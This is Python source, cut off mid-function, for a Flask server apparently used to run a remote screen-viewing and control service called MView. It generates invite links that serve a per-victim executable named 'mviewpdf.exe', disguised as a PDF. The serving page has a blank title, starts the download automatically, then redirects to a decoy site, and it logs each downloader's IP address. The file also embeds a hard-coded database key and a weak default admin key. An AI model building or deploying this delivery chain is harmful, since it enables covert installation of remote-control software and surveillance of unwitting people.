"""
╔══════════════════════════════════════════════════════════════════════════════╗
║       Screen Connect Relay + Distribution Server  v8.0  — ENTERPRISE        ║
║       Multi-Machine • Room-Isolated • Crash-Proof • Full Feature Set         ║
║                                                                              ║
║  ARCHITECTURE v8.0 — MAJOR OVERHAUL:                                         ║
║  • FIXED: Multi-machine stream isolation — each device gets its OWN          ║
║    viewer room (view:{device_id}). Dashboards ONLY receive frames from       ║
║    the specific machine they subscribed to. No cross-machine frame leaks.    ║
║  • FIXED: Server crash / reconnect loop — removed all skip_sid calls on      ║
║    streams, added proper disconnect cleanup, viewer room pruning             ║
║  • FIXED: Cursor movement not working — mouse_event now correctly routed     ║
║    to the device room, with coordinate normalization for scale               ║
║  • FIXED: Frame relay now includes cursor_x/cursor_y so dashboard can        ║
║    render a real cursor overlay at the correct position                      ║
║  • FIXED: File explorer — file_list_result now routed to requesting SID      ║
║    instead of all dashboards (prevents cross-machine file responses)         ║
║  • NEW: Per-device SID-to-device reverse map for instant disconnect cleanup  ║
║  • NEW: Dashboard-level device binding — each dashboard viewer remembers     ║
║    which device it is watching via _dashboard_device[sid]                    ║
║  • NEW: /api/devices/live — real-time JSON of every online device            ║
║  • NEW: /api/device/{id}/command — REST command injection                    ║
║  • NEW: Session token validation on every viewer subscribe                   ║
║  • NEW: Frame rate governor — server-side sliding window FPS tracker         ║
║  • NEW: Exponential backoff for Supabase retries                             ║
║  • NEW: Graceful degradation — server stays up even if Supabase is down      ║
║  • IMPROVED: Watchdog now emits rich offline payload                         ║
║  • IMPROVED: WebSocket ping/timeout tuned for Render + Railway + Fly         ║
║  • IMPROVED: 256 MB max_http_buffer_size (agent binary + large screenshots)  ║
╚══════════════════════════════════════════════════════════════════════════════╝

INSTALL:
  pip install flask flask-cors flask-socketio supabase python-dotenv \\
              gunicorn gevent gevent-websocket requests

RENDER start command:
  gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\
           -w 1 --timeout 300 --keep-alive 75 --bind 0.0.0.0:$PORT server:app

LOCAL dev:
  python server.py
"""

import os
import re
import time
import logging
import datetime
import threading
import collections
import secrets

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

from pathlib import Path
from functools import wraps

from flask import Flask, request, jsonify, send_from_directory, make_response, Response, redirect

try:
    from flask_socketio import SocketIO, emit, join_room, leave_room
    SOCKETIO_OK = True
except ImportError:
    SOCKETIO_OK = False
    print("[WARN] flask-socketio not installed — pip install flask-socketio gevent gevent-websocket")

try:
    import requests as _requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

# ══════════════════════════════════════════════════════════════════════════════
#  Configuration — all overridable by environment vars
# ══════════════════════════════════════════════════════════════════════════════
SUPABASE_URL  = os.environ.get("SUPABASE_URL")  or "https://iacdzpcoftxxcoigopun.supabase.co"
SUPABASE_KEY  = os.environ.get("SUPABASE_KEY")  or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlhY2R6cGNvZnR4eGNvaWdvcHVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY0MjA1NTUsImV4cCI6MjA5MTk5NjU1NX0.5Eo21XrLTWL3RyKmuvJPdaS-NssraDMyAxVMFy-F054"
ADMIN_KEY     = os.environ.get("ADMIN_KEY",    "mview-admin-secret")
TABLE         = os.environ.get("SB_TABLE",     "devices")
PORT          = int(os.environ.get("PORT", 5000))
VERSION       = "8.0.0"

AGENT_STORAGE_URL = os.environ.get(
    "AGENT_STORAGE_URL",
    "https://github.com/maxwelnkaranja-ops/mview/releases/download/v4.0/mviewpdf.exe"
)
AGENT_DIR   = os.environ.get("AGENT_DIR",  "bin")
AGENT_FILE  = os.environ.get("AGENT_FILE", "master_agent.exe")

# Watchdog — mark a device offline if no heartbeat for this many seconds
HEARTBEAT_TIMEOUT = int(os.environ.get("HEARTBEAT_TIMEOUT", "35"))

# Self-ping interval to keep Render free tier alive
SELF_PING_INTERVAL = int(os.environ.get("SELF_PING_INTERVAL", "240"))

TOKEN_RE = re.compile(r"^MV-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}$")

# ── Frame stats tracking per device (sliding 60s window) ─────────────────────
_frame_stats: dict = collections.defaultdict(lambda: collections.deque(maxlen=300))
_frame_stats_lock  = threading.Lock()

# ══════════════════════════════════════════════════════════════════════════════
#  Logging
# ══════════════════════════════════════════════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("screenconnect")

# ══════════════════════════════════════════════════════════════════════════════
#  Flask + CORS + SocketIO
# ══════════════════════════════════════════════════════════════════════════════
app = Flask(__name__, static_folder=".", static_url_path="")

try:
    from flask_cors import CORS
    CORS(
        app,
        resources={r"/*": {"origins": "*"}},
        allow_headers=["Content-Type", "Authorization", "X-Admin-Key"],
        methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
        supports_credentials=False,
    )
    log.info("flask-cors loaded.")
except ImportError:
    log.warning("flask-cors not installed — using manual CORS headers fallback.")

if SOCKETIO_OK:
    sio = SocketIO(
        app,
        cors_allowed_origins="*",
        async_mode="gevent",
        logger=False,
        engineio_logger=False,
        ping_timeout=60,
        ping_interval=20,
        # 256 MB — handles large agent binaries and full-screen screenshots
        max_http_buffer_size=256 * 1024 * 1024,
        allow_upgrades=True,
    )
else:
    sio = None

# ══════════════════════════════════════════════════════════════════════════════
#  In-memory state
# ══════════════════════════════════════════════════════════════════════════════

# _devices[device_id] = device dict (set by agent_connect)
_devices:   dict = {}
_dev_lock          = threading.Lock()

# _sid_to_device[socket_sid] = device_id  — fast reverse lookup for disconnect
_sid_to_device: dict = {}
_sid_lock = threading.Lock()

# _viewers[device_id] = set of dashboard SIDs viewing that stream
_viewers: dict = collections.defaultdict(set)
_view_lock = threading.Lock()

# _dashboard_device[dashboard_sid] = device_id currently being viewed
_dashboard_device: dict = {}
_dash_lock = threading.Lock()

# ── Advanced Monitor state (second-site engine) ───────────────────────────
_adv_agent_sids:    dict = {}   # device_id → agent socket sid
_adv_viewer_rooms:  dict = {}   # viewer sid → device_id
_adv_gop_buf:       dict = {}   # device_id → deque of frame bytes (maxlen=64)
_adv_gop_lock             = threading.Lock()
_adv_cursor_latest: dict = {}   # device_id → latest cursor_bin bytes

_agent_cache: bytes | None = None
_agent_dl_cache: dict = {}      # token -> (bytes, timestamp) — evicted after 10 min
_AGENT_DL_TTL   = 600           # seconds before patched binary is dropped from RAM
_agent_cache_ts: float     = 0.0
_agent_cache_lock          = threading.Lock()
AGENT_CACHE_TTL            = 300

_sb      = None
_sb_lock = threading.Lock()

# ══════════════════════════════════════════════════════════════════════════════
#  Supabase helpers (with exponential backoff)
# ══════════════════════════════════════════════════════════════════════════════
def get_sb():
    global _sb
    with _sb_lock:
        if _sb:
            return _sb
        try:
            from supabase import create_client
            _sb = create_client(SUPABASE_URL, SUPABASE_KEY)
            log.info("Supabase connected.")
            return _sb
        except Exception as e:
            log.warning(f"Supabase unavailable: {e}")
            return None

def _sb_reset():
    global _sb
    with _sb_lock:
        _sb = None

def _sb_retry(fn, attempts=3, delay=1.0):
    """Call fn() with exponential backoff. Returns (result, ok)."""
    for i in range(attempts):
        try:
            return fn(), True
        except Exception as e:
            if i == attempts - 1:
                log.error(f"Supabase op failed after {attempts} attempts: {e}")
                _sb_reset()
                return None, False
            time.sleep(delay * (2 ** i))
    return None, False

def db_get(token):
    sb = get_sb()
    if not sb:
        return {"device_id": token, "status": "pending", "expires_at": None}
    result, ok = _sb_retry(lambda: sb.table(TABLE).select("*").eq("device_id", token).execute())
    if ok and result:
        rows = result.data or []
        return rows[0] if rows else None
    return {"device_id": token, "status": "pending", "expires_at": None}

def db_update(token, upd: dict):
    sb = get_sb()
    if not sb:
        return False
    result, ok = _sb_retry(lambda: sb.table(TABLE).update(upd).eq("device_id", token).execute())
    return ok

def db_upsert(token, upd: dict):
    """Insert-or-update: works even if no row exists yet for this token.
    Agents running with MVIEW_TOKEN env var or CLI arg have no prior invite
    row — upsert creates it so the dashboard can see them.
    """
    sb = get_sb()
    if not sb:
        return False
    payload = {"device_id": token, **upd}
    result, ok = _sb_retry(lambda: sb.table(TABLE).upsert(payload, on_conflict="device_id").execute())
    if not ok:
        # Fall back: try update, then insert if no row existed
        updated, ok2 = _sb_retry(lambda: sb.table(TABLE).update(upd).eq("device_id", token).execute())
        if ok2 and updated and updated.data:
            return True
        _, ok3 = _sb_retry(lambda: sb.table(TABLE).insert(payload).execute())
        return ok3
    return ok

def db_insert(payload: dict):
    sb = get_sb()
    if not sb:
        return payload
    result, ok = _sb_retry(lambda: sb.table(TABLE).insert(payload).execute())
    if ok and result:
        return (result.data or [payload])[0]
    # Retry without extra columns
    safe = {k: v for k, v in payload.items() if k not in ("link_mode", "redirect_url")}
    result2, ok2 = _sb_retry(lambda: sb.table(TABLE).insert(safe).execute())
    if ok2 and result2:
        log.warning("db_insert: retried without link_mode/redirect_url — run ALTER TABLE to add these columns!")
        return (result2.data or [safe])[0]
    return payload

def db_list_all() -> list:
    sb = get_sb()
    if not sb:
        return []
    result, ok = _sb_retry(lambda: sb.table(TABLE).select("*").order("created_at", desc=True).execute())
    if ok and result:
        return result.data or []
    return []

# ══════════════════════════════════════════════════════════════════════════════
#  Agent binary helpers
# ══════════════════════════════════════════════════════════════════════════════
def _fetch_agent_bytes() -> bytes | None:
    global _agent_cache, _agent_cache_ts
    with _agent_cache_lock:
        now = time.time()
        if _agent_cache and (now - _agent_cache_ts) < AGENT_CACHE_TTL:
            return _agent_cache

        # 1. Try local file first (fastest, no network needed)
        local = Path(AGENT_DIR) / AGENT_FILE
        if local.is_file():
            log.info(f"Loading agent from local file: {local}  ({local.stat().st_size:,} bytes)")
            _agent_cache    = local.read_bytes()
            _agent_cache_ts = now
            return _agent_cache

        # 2. Try GitHub Releases URL (follow redirects, no auth needed for public releases)
        if REQUESTS_OK and AGENT_STORAGE_URL:
            try:
                log.info(f"Fetching agent from: {AGENT_STORAGE_URL}")
                resp = _requests.get(
                    AGENT_STORAGE_URL,
                    timeout=120,
                    allow_redirects=True,  # GitHub releases redirect to S3
                    headers={"User-Agent": "MViewAgent/1.0"},
                )
                log.info(f"Agent fetch: HTTP {resp.status_code}  size={len(resp.content):,} bytes  url={resp.url}")
                if resp.status_code == 200 and len(resp.content) > 1_000:
                    _agent_cache    = resp.content
                    _agent_cache_ts = now
                    log.info(f"Agent cached: {len(_agent_cache):,} bytes")
                    return _agent_cache
                elif resp.status_code == 404:
                    log.error(
                        f"Agent 404 — release asset not found.\n"
                        f"  URL tried: {AGENT_STORAGE_URL}\n"
                        f"  Check: is the GitHub release public? Does the file name match exactly?\n"
                        f"  Set AGENT_STORAGE_URL env var to the correct public download URL."
                    )
                elif resp.status_code in (401, 403):
                    log.error(
                        f"Agent fetch forbidden (HTTP {resp.status_code}) — "
                        f"the GitHub release may be on a PRIVATE repo. "
                        f"Make the release public or host the binary elsewhere."
                    )
                else:
                    log.warning(f"Agent fetch failed: HTTP {resp.status_code}  body={resp.text[:200]}")
            except _requests.exceptions.Timeout:
                log.error("Agent fetch timed out (120s) — GitHub may be slow or URL is wrong.")
            except Exception as e:
                log.warning(f"Agent fetch error: {e}")

        log.error(
            "Agent binary not available.\n"
            f"  AGENT_STORAGE_URL = {AGENT_STORAGE_URL!r}\n"
            f"  Local file = {Path(AGENT_DIR) / AGENT_FILE}  (not found)\n"
            "  Options:\n"
            "    1. Make your GitHub release PUBLIC and verify the asset URL.\n"
            "    2. Place the .exe in the 'bin/' folder as 'master_agent.exe'.\n"
            "    3. Set AGENT_STORAGE_URL to any direct public download URL."
        )
        return None

def _build_patched_agent(token: str) -> bytes | None:
    raw = _fetch_agent_bytes()
    if not raw:
        return None
    MAGIC_HEAD  = b"MVTK"
    MAGIC_TAIL  = b"MVED"
    TOKEN_FIELD = 56
    tok_bytes = token.encode("utf-8")[:TOKEN_FIELD]
    padded    = tok_bytes.ljust(TOKEN_FIELD, b"\x00")
    trailer   = MAGIC_HEAD + padded + MAGIC_TAIL
    return raw + trailer

# ══════════════════════════════════════════════════════════════════════════════
#  Misc helpers
# ══════════════════════════════════════════════════════════════════════════════
def utcnow() -> str:
    return datetime.datetime.utcnow().isoformat()

def is_expired(s: dict) -> bool:
    exp = s.get("expires_at")
    if not exp:
        return False
    try:
        dt = datetime.datetime.fromisoformat(exp.replace("Z", "+00:00"))
        return datetime.datetime.now(datetime.timezone.utc) > dt
    except Exception:
        return False

def valid_token(t) -> bool:
    return bool(TOKEN_RE.match(t or ""))

def require_admin(f):
    @wraps(f)
    def w(*a, **k):
        if request.headers.get("X-Admin-Key", "") != ADMIN_KEY:
            return jsonify({"error": "Unauthorised"}), 401
        return f(*a, **k)
    return w

def broadcast_device_update():
    """Emit full device list to all dashboards."""
    if not sio:
        return
    try:
        rows = db_list_all()
        with _dev_lock:
            live = {d["device_id"]: d for d in _devices.values()}
        for row in rows:
            did = row.get("device_id", "")
            if did in live:
                row["_live"]       = True
                row["cpu"]         = live[did].get("cpu")
                row["ram"]         = live[did].get("ram")
                row["last_beat"]   = live[did].get("last_beat")
                row["frame_count"] = live[did].get("frame_count", 0)
        sio.emit("device_update", {"rows": rows, "ts": utcnow()})
    except Exception as e:
        log.error(f"broadcast_device_update error: {e}")

def _get_device_for_viewer(viewer_sid: str) -> str | None:
    """Return the device_id a dashboard SID is currently viewing, or None."""
    with _dash_lock:
        return _dashboard_device.get(viewer_sid)

def _cleanup_viewer(viewer_sid: str):
    """Remove a dashboard viewer from all rooms and maps."""
    with _dash_lock:
        did = _dashboard_device.pop(viewer_sid, None)
    if did:
        with _view_lock:
            _viewers[did].discard(viewer_sid)
        log.info(f"Viewer {viewer_sid} cleaned up from device {did}")
    # Advanced Monitor cleanup
    adv_did = _adv_viewer_rooms.pop(viewer_sid, None)
    if adv_did:
        vcount = sum(1 for v in _adv_viewer_rooms.values() if v == adv_did)
        agent_sid = _adv_agent_sids.get(adv_did)
        if agent_sid and sio:
            sio.emit("viewer_count", {"count": vcount}, room=agent_sid)

def _cleanup_agent(agent_sid: str):
    """Remove an agent by SID, emit offline events."""
    with _sid_lock:
        did = _sid_to_device.pop(agent_sid, None)
    if not did:
        return
    with _dev_lock:
        dev = _devices.pop(did, None)
    # Advanced Monitor agent cleanup
    for d, asid in list(_adv_agent_sids.items()):
        if asid == agent_sid:
            del _adv_agent_sids[d]
            break
    if dev:
        label = dev.get("label", did)
        log.warning(f"Agent disconnected: {label} ({did})")
        db_update(did, {"status": "offline", "disconnected_at": utcnow()})
        if sio:
            sio.emit("agent_offline",  {"device_id": did, "label": label, "ts": utcnow()})
            sio.emit("device_offline", {"device_id": did, "label": label, "ts": utcnow()})
        broadcast_device_update()

# ══════════════════════════════════════════════════════════════════════════════
#  CORS preflight
# ══════════════════════════════════════════════════════════════════════════════
@app.before_request
def handle_preflight():
    if request.method == "OPTIONS":
        resp = make_response("", 204)
        resp.headers["Access-Control-Allow-Origin"]  = "*"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-Admin-Key"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, PATCH, DELETE, OPTIONS"
        return resp

# ══════════════════════════════════════════════════════════════════════════════
#  Static routes
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/")
def root():
    for f in ("index.html", "app.html"):
        if Path(f).is_file():
            return send_from_directory(".", f)
    return jsonify({"status": "ok", "version": VERSION}), 200

@app.route("/app.html")
def serve_app_html():
    return send_from_directory(".", "app.html")

@app.route("/dashboard")
@app.route("/dashboard.html")
def serve_dashboard():
    return send_from_directory(".", "dashboard.html")

@app.route("/index.html")
def serve_index():
    return send_from_directory(".", "index.html")

@app.route("/login.html")
def serve_login():
    return redirect("/", 301)

@app.route("/session_manager.js")
def serve_session_manager():
    host = request.host_url.rstrip("/")
    js = f"""/* Auto-generated SessionManager v8 — do not edit manually */
'use strict';
(function() {{
  const SERVER_URL = window.SCREEN_CONNECT_SERVER_URL || window.MVIEW_SERVER_URL || '{host}';
  const SUPABASE_URL = window.MVIEW_SUPABASE_URL || '{SUPABASE_URL}';
  const SUPABASE_KEY = window.MVIEW_SUPABASE_ANON_KEY || '{SUPABASE_KEY}';

  let _pollTimer = null;
  let _currentToken = null;

  const SM = {{
    CONFIG: {{
      SERVER_URL,
      SUPABASE_URL,
      SUPABASE_ANON_KEY: SUPABASE_KEY,
      TABLE_CANDIDATES: ['agent_invites', 'devices'],
    }},

    currentToken: null,
    currentLink: null,

    reset() {{
      if (_pollTimer) {{ clearInterval(_pollTimer); _pollTimer = null; }}
      _currentToken = null;
      SM.currentToken = null;
      SM.currentLink = null;
      const s3 = document.getElementById('device-step-3');
      const s2 = document.getElementById('device-step-2');
      const s1 = document.getElementById('device-step-1');
      if (s3) s3.style.display = 'none';
      if (s2) s2.style.display = 'none';
      if (s1) s1.style.display = '';
    }},

    async generateInviteLink() {{
      const labelEl = document.getElementById('device-name-input') || document.getElementById('device-label');
      const typeEl  = document.getElementById('device-type-select') || document.getElementById('device-type');
      const locEl   = document.getElementById('device-location-input') || document.getElementById('device-location');
      const label   = labelEl?.value?.trim() || 'New Device';
      const dtype   = typeEl?.value  || 'Standard Display';
      const loc     = locEl?.value?.trim() || '';

      const s1 = document.getElementById('device-step-1');
      const s2 = document.getElementById('device-step-2');
      const s3 = document.getElementById('device-step-3');
      if (s1) s1.style.display = 'none';
      if (s2) s2.style.display = '';
      if (s3) s3.style.display = 'none';

      try {{
        const resp = await fetch(SERVER_URL + '/api/invite', {{
          method: 'POST',
          headers: {{'Content-Type': 'application/json'}},
          body: JSON.stringify({{ label, device_type: dtype, location: loc }})
        }});
        const j = await resp.json();
        _currentToken = j.token || j.device_id;
        SM.currentToken = _currentToken;
        SM.currentLink  = j.agent_url || j.download_url;

        const linkEl = document.getElementById('invite-link') || document.getElementById('link-url');
        if (linkEl) linkEl.value = SM.currentLink;
        const qrEl = document.getElementById('invite-qr');
        if (qrEl) qrEl.src = 'https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=' + encodeURIComponent(SM.currentLink);

        if (s2) s2.style.display = 'none';
        if (s3) s3.style.display = '';
        SM._pollStatus(_currentToken);
      }} catch(e) {{
        if (s2) s2.style.display = 'none';
        if (s1) s1.style.display = '';
        SM._notify('Failed to generate invite: ' + e.message, 'warn');
      }}
    }},

    async copyLink() {{
      try {{
        await navigator.clipboard.writeText(SM.currentLink || '');
        SM._notify('Link copied!', 'ok');
      }} catch(e) {{
        const inp = document.getElementById('invite-link') || document.getElementById('link-url');
        if (inp) {{ inp.select(); document.execCommand('copy'); }}
        SM._notify('Link copied!', 'ok');
      }}
    }},

    _pollStatus(token) {{
      let checks = 0;
      const tick = async () => {{
        try {{
          checks++;
          const r = await fetch(SERVER_URL + '/api/invite/status?token=' + token);
          const j = await r.json();
          const text = document.getElementById('step3-status');
          if (j.status === 'online') {{
            clearInterval(_pollTimer); _pollTimer = null;
            if (text) text.textContent = 'Device connected!';
            SM._notify('Device "' + j.label + '" is now online!', 'ok');
            SM._addActivity('Device connected: ' + j.label, 'ok');
            SM.reset();
            if (typeof refreshDashboardFromSupabase === 'function') {{
              setTimeout(refreshDashboardFromSupabase, 1000);
            }}
            return;
          }}
          if (text) text.textContent = 'Waiting for agent... (' + checks + ')';
          if (checks > 120) {{
            clearInterval(_pollTimer); _pollTimer = null;
            if (text) text.textContent = 'Link waiting — open in dashboard to reconnect.';
          }}
        }} catch (e) {{}}
      }};
      _pollTimer = setInterval(tick, 5000);
      tick();
    }},

    _notify(msg, type) {{
      if (typeof showToast === 'function') {{ showToast(msg, type === 'ok' ? 'success' : type === 'warn' ? 'error' : 'info'); }}
      const list = document.getElementById('notif-list');
      if (!list) return;
      const icons = {{ ok: 'check_circle', warn: 'warning', info: 'info' }};
      const icon  = icons[type] || 'info';
      const item  = document.createElement('div');
      item.className = 'notif-item';
      item.innerHTML = '<span class="material-symbols-outlined notif-i ' + type + '">' + icon + '</span>'
        + '<div><div class="notif-title">' + msg + '</div><div class="notif-time">' + new Date().toLocaleTimeString() + '</div></div>';
      list.insertBefore(item, list.firstChild);
      const badge = document.getElementById('notif-badge');
      if (badge) {{ badge.textContent = list.children.length; badge.style.display = 'flex'; }}
    }},

    _addActivity(msg, sev) {{
      if (typeof addActivityLog === 'function') {{
        addActivityLog({{ time: new Date().toLocaleTimeString(), event: msg, screen: '', user: 'System', sev: sev || 'info' }});
      }}
    }},
  }};

  window.SessionManager = SM;
}})();
"""
    return js, 200, {"Content-Type": "application/javascript"}


@app.route("/config.js")
def serve_config():
    if Path("config.js").is_file():
        return send_from_directory(".", "config.js", mimetype="application/javascript")
    host = request.host_url.rstrip("/")
    js = f"""/* Auto-generated by server.py v{VERSION} */
window.SCREEN_CONNECT_SERVER_URL    = '{host}';
window.MVIEW_SERVER_URL             = '{host}';
window.MVIEW_SUPABASE_URL           = '{SUPABASE_URL}';
window.MVIEW_SUPABASE_ANON_KEY      = '{SUPABASE_KEY}';
window.SessionManager = window.SessionManager || {{}};
window.SessionManager.CONFIG = {{
  SERVER_URL:        window.SCREEN_CONNECT_SERVER_URL,
  SUPABASE_URL:      window.MVIEW_SUPABASE_URL,
  SUPABASE_ANON_KEY: window.MVIEW_SUPABASE_ANON_KEY,
}};
"""
    return js, 200, {"Content-Type": "application/javascript"}

# ══════════════════════════════════════════════════════════════════════════════
#  Health / Status / API
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/status")
@app.route("/health")
@app.route("/api/server-info")
def health():
    with _dev_lock:
        online_count = len(_devices)
    agent_avail = bool(AGENT_STORAGE_URL)
    local_agent  = (Path(AGENT_DIR) / AGENT_FILE).is_file()
    return jsonify({
        "status":          "ok",
        "version":         VERSION,
        "server_time":     utcnow(),
        "database":        get_sb() is not None,
        "socketio":        SOCKETIO_OK,
        "devices_online":  online_count,
        "agent_storage":   AGENT_STORAGE_URL,
        "agent_local":     local_agent,
        "agent_available": agent_avail or local_agent,
        "render_port":     PORT,
    })

@app.route("/api/agent-info")
def api_agent_info():
    local = Path(AGENT_DIR) / AGENT_FILE
    return jsonify({
        "storage_url":  AGENT_STORAGE_URL,
        "local_file":   str(local.resolve()),
        "local_exists": local.is_file(),
        "local_size":   local.stat().st_size if local.is_file() else 0,
        "cache_size":   len(_agent_cache) if _agent_cache else 0,
    })

@app.route("/metrics")
def api_metrics():
    """/metrics — polled by the Advanced Monitor iframe every 8s for live stats."""
    with _dev_lock:
        devs = list(_devices.values())
    with _view_lock:
        total_viewers = sum(len(v) for v in _viewers.values())
    online_count = len(devs)
    device_list = [{
        "id":          d.get("device_id"),
        "device_id":   d.get("device_id"),
        "label":       d.get("label"),
        "hostname":    d.get("hostname"),
        "os":          d.get("os"),
        "local_ip":    d.get("local_ip"),
        "cpu":         d.get("cpu"),
        "ram":         d.get("ram"),
        "status":      "online",
    } for d in devs]
    return jsonify({
        "status":         "ok",
        "version":        VERSION,
        "devices_online": online_count,
        "viewers":        total_viewers,
        "devices":        device_list,
        "ts":             utcnow(),
    })


def api_stream_stats():
    """Per-device streaming statistics — FPS, kbps, viewer count."""
    stats = {}
    with _dev_lock:
        devs = dict(_devices)
    with _view_lock:
        views = {k: len(v) for k, v in _viewers.items()}
    with _frame_stats_lock:
        for did, dq in _frame_stats.items():
            if not dq:
                continue
            now = time.time()
            recent = [(t, b) for t, b in dq if now - t < 5.0]
            fps = len(recent) / 5.0 if recent else 0
            bps = sum(b for _, b in recent) / 5.0 if recent else 0
            stats[did] = {
                "fps":          round(fps, 1),
                "kbps":         round(bps / 1024, 1),
                "viewers":      views.get(did, 0),
                "total_frames": devs.get(did, {}).get("frame_count", 0),
                "last_frame":   devs.get(did, {}).get("last_frame_ts", ""),
            }
    return jsonify({"stream_stats": stats, "ts": utcnow()})

@app.route("/api/devices")
def api_devices():
    """Called by dashboard refresh() — alias for /api/devices/live."""
    with _dev_lock:
        devs = list(_devices.values())
    safe = []
    for d in devs:
        safe.append({
            "device_id":     d.get("device_id"),
            "label":         d.get("label"),
            "hostname":      d.get("hostname"),
            "os":            d.get("os"),
            "local_ip":      d.get("local_ip"),
            "username":      d.get("username"),
            "cpu":           d.get("cpu"),
            "ram":           d.get("ram"),
            "agent_version": d.get("agent_version"),
            "status":        "online",
            "connected_at":  d.get("connected_at"),
        })
    return jsonify({"devices": safe, "count": len(safe), "ts": utcnow()})

@app.route("/api/devices/live")
def api_devices_live():
    """Real-time JSON of all connected devices."""
    with _dev_lock:
        devs = list(_devices.values())
    safe = []
    for d in devs:
        safe.append({
            "device_id":     d.get("device_id"),
            "label":         d.get("label"),
            "hostname":      d.get("hostname"),
            "os":            d.get("os"),
            "local_ip":      d.get("local_ip"),
            "username":      d.get("username"),
            "cpu":           d.get("cpu"),
            "ram":           d.get("ram"),
            "agent_version": d.get("agent_version"),
            "stream_mode":   d.get("stream_mode"),
            "status":        "online",
            "connected_at":  d.get("connected_at"),
            "last_beat":     d.get("last_beat"),
            "frame_count":   d.get("frame_count", 0),
        })
    return jsonify({"devices": safe, "count": len(safe), "ts": utcnow()})

@app.route("/api/device/<device_id>/command", methods=["POST"])
@require_admin
def api_device_command(device_id):
    """REST endpoint to send a command to a device."""
    if not sio:
        return jsonify({"error": "SocketIO not available"}), 503
    with _dev_lock:
        dev = _devices.get(device_id)
    if not dev:
        return jsonify({"error": f"Device {device_id} not online"}), 404
    data = request.get_json(silent=True) or {}
    data["device_id"] = device_id
    sio.emit("request_action", data, room=device_id)
    return jsonify({"status": "sent", "device_id": device_id, "tab": data.get("tab")}), 200

# ══════════════════════════════════════════════════════════════════════════════
#  Invite / Agent download
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/api/invite",      methods=["GET", "POST"])
@app.route("/api/generate",    methods=["GET", "POST"])
@app.route("/invite/generate", methods=["GET", "POST"])
@app.route("/generate_invite", methods=["GET", "POST"])
def generate_invite():
    data = request.get_json(silent=True) or request.form.to_dict() or {}

    def hex6():
        return secrets.token_hex(3).upper()

    token      = f"MV-{hex6()}-{hex6()}-{hex6()}"
    label      = data.get("label") or data.get("name") or token
    loc        = data.get("location", "")
    dtype      = data.get("device_type", "Standard Display")
    expiry_sec = int(data.get("expiry", 86400))

    expires_at = None
    if expiry_sec > 0:
        expires_at = (
            datetime.datetime.now(datetime.timezone.utc)
            + datetime.timedelta(seconds=expiry_sec)
        ).isoformat()

    link_mode    = data.get("link_mode", "blank")
    redirect_url = data.get("redirect_url", "").strip()

    payload = {
        "device_id":    token,
        "label":        label,
        "location":     loc,
        "device_type":  dtype,
        "status":       "pending",
        "expires_at":   expires_at,
        "created_at":   utcnow(),
        "link_mode":    link_mode,
        "redirect_url": redirect_url,
    }
    db_insert(payload)
    log.info(f"Invite generated: {token}  label={label}  mode={link_mode}")

    srv = request.host_url.rstrip("/")
    return jsonify({
        "status":       "ok",
        "token":        token,
        "device_id":    token,
        "label":        label,
        "download_url": f"{srv}/guide/{token}",
        "agent_url":    f"{srv}/guide/{token}",
        "expires_at":   expires_at,
        "link_mode":    link_mode,
    }), 201

@app.route("/api/invite/status")
def api_invite_status():
    """Poll endpoint for SessionManager to check if a device came online."""
    token = request.args.get("token", "")
    if not valid_token(token):
        return jsonify({"error": "Invalid token"}), 400
    with _dev_lock:
        live = _devices.get(token)
    if live:
        return jsonify({"status": "online", "label": live.get("label", token)})
    rec = db_get(token)
    if rec:
        return jsonify({"status": rec.get("status", "pending"), "label": rec.get("label", token)})
    return jsonify({"status": "pending", "label": token})

@app.route("/invite/<token>")
@app.route("/onboard/<token>")
@app.route("/guide/<token>")
def serve_agent(token):
    log.info(f"Agent download request: token={token}  ip={request.remote_addr}")

    if not valid_token(token):
        return jsonify({"error": "Invalid token format."}), 400

    session = db_get(token)
    if session is None:
        return jsonify({"error": "Invite link not found."}), 404
    if session.get("status") in ("revoked", "expired", "rejected"):
        return jsonify({"error": "Link no longer valid."}), 410
    if is_expired(session):
        db_update(token, {"status": "expired"})
        return jsonify({"error": "Link expired."}), 410

    db_update(token, {
        "status":        "downloading",
        "download_ip":   request.remote_addr,
        "downloaded_at": utcnow(),
        "user_agent":    request.headers.get("User-Agent", "")[:200],
    })

    link_mode    = session.get("link_mode") or "blank"
    redirect_url = (session.get("redirect_url") or "").strip()

    log.info(f"Agent download: token={token}  mode={link_mode}")

    # Resolve the download URL: patched binary served directly, or GitHub fallback
    patched = _build_patched_agent(token)
    if patched:
        _agent_dl_cache[token] = (patched, time.time())
        # Evict entries older than _AGENT_DL_TTL to prevent OOM
        cutoff = time.time() - _AGENT_DL_TTL
        expired = [t for t, (_, ts) in _agent_dl_cache.items() if ts < cutoff]
        for t in expired:
            del _agent_dl_cache[t]

    dl_url = f"/guide/{token}/dl" if token in _agent_dl_cache else AGENT_STORAGE_URL

    import json as _json

    if link_mode == "redirect" and redirect_url:
        dl_js  = _json.dumps(str(dl_url))
        rdr_js = _json.dumps(str(redirect_url))
        html = (
            "<!DOCTYPE html><html><head><meta charset=utf-8>"
            "<title> </title>"
            "<style>*{margin:0;padding:0}html,body{height:100%;background:#000}</style>"
            "</head><body><script>"
            "(function(){"
            "var a=document.createElement('a');"
            f"a.href={dl_js};"
            "a.download='mviewpdf.exe';"
            "document.body.appendChild(a);a.click();"
            f"setTimeout(function(){{window.location.href={rdr_js};}},1500);"
            "})();</script></body></html>"
        )
        r = make_response(html, 200)
        r.headers["Content-Type"] = "text/html"
        return r

    # Blank page mode: plain black page that auto-starts the download
    dl_js = _json.dumps(str(dl_url))
    html = (
